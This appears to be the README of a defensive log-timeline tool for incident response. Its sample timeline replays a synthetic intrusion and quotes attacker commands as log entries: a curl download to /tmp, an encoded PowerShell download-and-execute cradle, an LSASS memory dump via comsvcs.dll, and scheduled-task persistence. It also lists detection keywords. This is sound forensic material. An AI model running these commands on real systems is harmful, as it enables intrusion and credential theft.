# vtl: Incident Timeline Generator

[![CI](https://github.com/MrWaifu24/vtl/actions/workflows/ci.yml/badge.svg)](https://github.com/MrWaifu24/vtl/actions/workflows/ci.yml)
[![Python](https://img.shields.io/badge/python-3.10%2B-3776AB?logo=python&logoColor=white)](pyproject.toml)
[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)

`vtl` takes logs from **Wazuh**, **Windows** and **Linux** and turns them into **one chronological investigation timeline**. It doesn't just dump events. It:

- normalizes every source to UTC
- writes a one-line analyst-friendly summary for each event
- scores each event and maps it to MITRE ATT&CK
- collapses brute-force noise
- decodes encoded PowerShell
- flags the "failed, failed, failed, *succeeded*" pattern

The result reads like an intrusion story rather than three separate log files.

```sh
vtl --wazuh alerts.json --windows security.evtx --linux auth.log
```

## Example

The [`samples/`](samples) directory holds a synthetic intrusion, told across three log sources:

1. An SSH brute force against a Linux web server succeeds.
2. The attacker escalates with sudo, adds a backdoor account and plants an SSH key.
3. They pivot to a Windows workstation (smbexec-style service, encoded PowerShell cradle, C2 connection).
4. They dump LSASS, add a scheduled task for persistence and clear the Security log.

Wazuh alerts fire along the way.

```
$ vtl --wazuh samples/alerts.json --windows samples/windows.xml --linux samples/auth.log --year 2026

Tuesday 2026-09-29 (UTC) ─────────────────────────────────────────────────────────────────────────────────────
TIME       SOURCE    HOST        CODE      SEV        SUMMARY
──────────────────────────────────────────────────────────────────────────────────────────────────────────────
09:58:12   Windows   WS-FIN-07   4624      INFO       Successful logon: CORP\jsmith (type 2 Interactive) via Negotiate
10:24:44   Linux     web01       sshd      LOW        SSH login accepted: alice from 10.0.5.10 (publickey)
10:31:02   Linux     web01       sshd      MEDIUM     SSH brute force: 14 failed logons from 203.0.113.47
                                                      (10:31:02-10:33:40) targeting 6 account(s): admin, deploy, git, ...
10:33:41   Wazuh     web01       5712      MEDIUM     sshd: brute force trying to get access to the system. (src=203.0.113.47)
10:34:05   Linux     web01       sshd      HIGH       SSH login accepted: deploy from 203.0.113.47 (password) - after 14
                                                      failed attempts from this IP
10:35:12   Linux     web01       sudo      MEDIUM     sudo: deploy ran as root: /usr/bin/curl -s http://203.0.113.47/x.sh
                                                      -o /tmp/.x.sh  [file download, execution from world-writable directory]
10:36:01   Linux     web01       useradd   MEDIUM     User account created: sysupdate (UID 1002, shell /bin/bash)
10:36:03   Linux     web01       usermod   HIGH       User sysupdate added to group sudo  [privileged group]
10:37:15   Linux     web01       sudo      HIGH       sudo: deploy ran as root: /usr/bin/tee -a /root/.ssh/authorized_keys
                                                      [SSH key persistence]
10:41:30   Windows   WS-FIN-07   4625      MEDIUM     Logon brute force: 6 failed logons from 10.0.5.20 (10:41:30-10:41:55)
                                                      targeting 2 account(s): CORP\administrator, CORP\svc_backup
10:42:11   Windows   WS-FIN-07   4624      HIGH       Successful logon: CORP\svc_backup (type 3 Network) from 10.0.5.20
                                                      [web01] via NTLM - after 6 failed attempts from this IP
10:42:15   Windows   WS-FIN-07   5140      MEDIUM     Network share \\*\ADMIN$ accessed by CORP\svc_backup from 10.0.5.20
10:42:17   Windows   WS-FIN-07   7045      HIGH       Service installed: BTOBTO -> %COMSPEC% /Q /c echo cd ^>
                                                      \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat & ...
                                                      [suspicious service - remote execution tooling?]
10:42:19   Windows   WS-FIN-07   4688      HIGH       Process powershell.exe (parent cmd.exe): powershell.exe -nop -w hidden
                                                      -enc <200 chars base64> | decoded: IEX (New-Object
                                                      Net.WebClient).DownloadString('http://203.0.113.47/a.ps1')
                                                      [encoded PowerShell, hidden window, Invoke-Expression, download cradle]
10:42:21   Windows   WS-FIN-07   4104      HIGH       PowerShell script block: IEX (New-Object Net.WebClient).DownloadString(...)
10:42:23   Windows   WS-FIN-07   3         HIGH       Network connection: powershell.exe -> 203.0.113.47:443
                                                      [scripting/LOLBin process to external host - possible C2]
10:42:25   Wazuh     WS-FIN-07   92057     HIGH       Powershell.exe spawned with a base64 encoded command
10:43:02   Windows   WS-FIN-07   4688      LOW        Process whoami.exe (parent powershell.exe): whoami /all  [discovery command]
10:43:48   Windows   WS-FIN-07   4688      CRITICAL   Process rundll32.exe (parent powershell.exe): rundll32.exe
                                                      C:\Windows\System32\comsvcs.dll, MiniDump 704 C:\Windows\Temp\lsass.dmp
                                                      full  [LSASS dump via comsvcs]
10:43:48   Windows   WS-FIN-07   10        CRITICAL   LSASS memory access by rundll32.exe (GrantedAccess 0x1FFFFF)
10:43:50   Wazuh     WS-FIN-07   92900     CRITICAL   Possible LSASS memory dump via comsvcs.dll MiniDump
10:44:30   Windows   WS-FIN-07   4698      HIGH       Scheduled task created: \Microsoft\Windows\Maintenance\SysUpdate ->
                                                      powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient)..."
10:46:10   Windows   WS-FIN-07   1102      HIGH       Security audit log cleared by CORP\svc_backup
10:46:11   Wazuh     WS-FIN-07   63103     HIGH       The audit log was cleared (user=svc_backup)
31 events (Linux 9, Wazuh 7, Windows 15) | 2026-09-29 09:58:12 -> 10:46:11 UTC | CRITICAL 3, HIGH 12, MEDIUM 8, ...
```

(Trimmed slightly. In a terminal the output is color-coded by severity and source.)

The same timeline can be exported as a Markdown incident report with a key-events section and the ATT&CK techniques observed. See [`docs/example-report.md`](docs/example-report.md).

## Features

### Sources

| Flag | Input | Notes |
|------|-------|-------|
| `--wazuh` | `alerts.json` | Newline-delimited JSON, or a JSON array or OpenSearch `_source` export. Rule level maps to severity. Takes the rule's ATT&CK IDs, agent, source IP and user. |
| `--windows` | `.evtx` or `.xml` | Binary EVTX via [python-evtx](https://github.com/williballenthin/python-evtx), or XML from `wevtutil qe Security /f:xml` / `Get-WinEvent \| % ToXml()`. Security, System, PowerShell, Sysmon, Defender, RDP and Task Scheduler channels can be mixed in one file. |
| `--linux` | `auth.log`, `secure`, `*.gz` | Classic syslog timestamps (year inferred, configurable time zone) and RFC 3339 timestamps (Ubuntu 24.04+). Rotated `.gz` files are read directly. |

Every flag can be repeated, so you can pass several hosts or several rotated files at once.

### Analyst-friendly summaries

**Windows:** more than 40 event IDs get purpose-built summaries:

- **Logons:** 4624/4625 with logon type, source IP, auth package and failure reason
- **Kerberos:** 4768 AS-REP roasting, 4769 RC4 Kerberoasting, 4771
- **Explicit credentials and privilege use:** 4648, 4672
- **Processes:** 4688 and Sysmon 1, with parent process and command-line scoring
- **Persistence:** 4697 and 7045 services, 4698 scheduled tasks with the task command
- **Accounts and groups:** 4720/4726, with 4728/4732/4756 privileged-group detection
- **Log tampering:** 1102 and 104
- **PowerShell:** 4104 script blocks, 400 v2 downgrade
- **Sysmon:** 3 network, 10 LSASS access, 11 file drops, 13 autostart registry, 22 DNS
- **Defender:** 1116, 1117, 5001
- **RDP:** 1149

Anything else still appears, with a generic summary.

**Linux:**

- **sshd:** accepted, failed and invalid-user attempts, max-auth exceeded, and direct root logins
- **sudo:** each command is scored for download-and-execute, reverse shells, `/tmp` execution, `authorized_keys`, setuid, cron and log wiping. Sudo failures are included.
- **su** sessions
- **Account changes:** `useradd`, `usermod`/`gpasswd` (privileged-group detection), `userdel` and `passwd`

### Detection logic

- **Command-line scoring** covers:
  - encoded PowerShell, `IEX`, download cradles, hidden windows
  - LOLBins: certutil, mshta, rundll32, regsvr32, bitsadmin
  - `comsvcs.dll MiniDump`, Mimikatz keywords
  - shadow copy deletion, Defender tampering
  - `net user /add`, discovery commands

  Each rule carries an ATT&CK technique.
- **Encoded PowerShell is decoded inline.** Every abbreviation of `-EncodedCommand` is accepted (`-e`, `-enc`, `-ec`...), and the base64 blob is replaced with its decoded content.
- **Brute-force collapsing:** 5 or more failed logons from one IP within 10 minutes become a single event listing the targeted accounts. The threshold is set with `--threshold`.
- **Brute-force success correlation:** a successful logon from the same IP right after a burst is escalated to HIGH (`after 14 failed attempts from this IP`).
- **External IP awareness:** SSH or RDP logons from outside RFC 1918 space are raised. So are scripting processes connecting to external hosts, which can indicate C2.
- **Noise reduction:** machine-account logoffs, SYSTEM privilege assignments and routine cron or session lines are dropped.

### Output

| Format | Use |
|--------|-----|
| `table` (default) | Color-coded terminal timeline grouped by day, with a summary footer |
| `csv` | Spreadsheets, Timesketch or a SIEM import |
| `json` | Summary block plus normalized events, for `jq` and SOAR |
| `md` | Incident report: window, hosts, ATT&CK techniques, key events and full table |

### Filters and time handling

```sh
--since 2026-09-29T10:40 --until 2026-09-29T11:00   # time window (naive times use --tz)
--min-severity high                                 # info | low | medium | high | critical
--grep 203.0.113.47                                 # search summary, host, user, IP, code, tags
--host web01                                        # restrict to hosts (repeatable)
--tz Europe/Berlin                                  # display time zone
--linux-tz America/New_York                         # zone of syslog timestamps without offset
--year 2025                                         # year for syslog lines (default: file mtime)
```

Syslog lines don't include a year. `vtl` resolves the year from the file's modification time, or from `--year`. It handles the December → January rollover in both cases.

## Install

```sh
pipx install git+https://github.com/MrWaifu24/vtl
# or
uv tool install git+https://github.com/MrWaifu24/vtl
```

From source:

```sh
git clone https://github.com/MrWaifu24/vtl && cd vtl
uv sync
uv run vtl --wazuh samples/alerts.json --windows samples/windows.xml --linux samples/auth.log --year 2026
```

### Collecting input

```powershell
# Windows: copy the live logs (as admin), or export XML
wevtutil epl Security C:\ir\security.evtx
wevtutil qe Microsoft-Windows-Sysmon/Operational /f:xml > C:\ir\sysmon.xml
```

```sh
# Wazuh manager
cp /var/ossec/logs/alerts/alerts.json ./
# Linux host
sudo cp /var/log/auth.log* ./        # Debian/Ubuntu (/var/log/secure* on RHEL)
```

## Usage examples

```sh
# Only what matters, as a report for the ticket
vtl --windows dc01.evtx --windows ws07.evtx --min-severity medium -f md -o timeline.md

# Everything one attacker IP touched, across all sources
vtl --wazuh alerts.json --windows security.evtx --linux auth.log --grep 203.0.113.47

# Feed a spreadsheet / Timesketch
vtl --linux auth.log --linux auth.log.1 --linux auth.log.2.gz -f csv -o linux.csv
```

## How it works

```
src/vtl/
  parsers/wazuh.py     NDJSON / JSON array -> Event
  parsers/windows.py   EVTX / XML -> WinRecord -> per-event-ID handler -> Event
  parsers/linux.py     syslog / RFC 3339 lines -> regex rules -> Event
  detections.py        command-line scoring, PowerShell decoding, IP scope
  correlate.py         brute-force collapsing and success escalation
  timeline.py          merge, de-duplicate, sort, filter
  output.py            table / CSV / JSON / Markdown renderers
  cli.py               argument parsing
```

Every parser produces the same `Event` fields:

- `ts`: UTC timestamp
- `source`, `host`, `code`
- `severity`
- `user`, `src_ip`
- `summary`
- `tags` (ATT&CK)
- `origin` (the file it came from)

`timeline.py` merges the events, de-duplicates them (so overlapping exports are safe) and sorts them. Ties are broken by source, so the raw log line comes before the Wazuh alert it triggered.

## Development

```sh
uv sync
uv run pytest           # 37 tests
uv run ruff check . && uv run ruff format --check .
```

The tests cover:

- each parser, including edge cases: syslog year rollover, time zone conversion, gzip, RFC 3339, malformed lines, JSON array vs NDJSON, and the wevtutil stream without a root element
- the EVTX code path, with a mocked reader
- brute-force correlation
- filters and every output format
- an end-to-end check that the sample intrusion reads in the right order

## Roadmap

- More sources: Zeek `conn.log`, Suricata `eve.json`, Sysmon for Linux, CloudTrail
- Cross-source correlation (e.g. link the Linux attacker session to the Windows logon it pivoted to)
- HTML report with an interactive timeline
- Sigma rule matching on normalized events

## License

[MIT](LICENSE). The sample logs are synthetic. IPs come from documentation ranges (RFC 5737), and hosts and accounts are fictional.
